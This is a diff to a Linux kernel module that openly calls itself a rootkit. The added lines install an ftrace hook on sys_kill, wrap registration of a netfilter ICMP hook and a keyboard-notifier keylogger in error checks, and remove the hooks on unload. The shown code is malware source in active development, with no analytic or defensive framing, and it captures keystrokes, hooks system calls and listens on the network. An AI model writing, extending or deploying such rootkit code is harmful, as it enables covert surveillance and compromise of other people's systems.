@@ -6,7 +6,12 @@
 #include "rootkit.h"
 #include "debug.h"
 #include "keylogger.h"
+#include "hooks.h"
 
+
+static struct ftrace_hook hooks[] = {
+    HOOK("sys_kill", hook_kill, &orig_kill),
+};
 
 // hook for handling icmp packets
 static struct nf_hook_ops nfho;
@@ -24,10 +29,23 @@ static int __init startup(void)
     nfho.hooknum = NF_INET_PRE_ROUTING;
     nfho.pf = PF_INET;
     nfho.priority = NF_IP_PRI_FIRST;
-    nf_register_net_hook(&init_net, &nfho);
+    if (nf_register_net_hook(&init_net, &nfho) != 0) {
+        DEBUG_PUTS("rootkit: can't register a net hook\n")
+        return -1;
+    }
 
     init_keylogger_buffer();
-    register_keyboard_notifier(&nb);
+    if (register_keyboard_notifier(&nb) != 0) {
+        DEBUG_PUTS("rootkit: can't register a keyboard notifier\n")
+        return -2;
+
+    }
+
+    if (fh_install_hooks(hooks, ARRAY_SIZE(hooks)) != 0) {
+        DEBUG_PUTS("rootkit: can't register a hook\n")
+        return -3;
+    }
+
     
     DEBUG_PUTS("rootkit: start\n")
 
@@ -40,6 +58,8 @@ static void __exit cleanup(void)
     nf_unregister_net_hook(&init_net, &nfho);
 
     unregister_keyboard_notifier(&nb);
+
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 
     DEBUG_PUTS("rootkit: finished\n")
 }
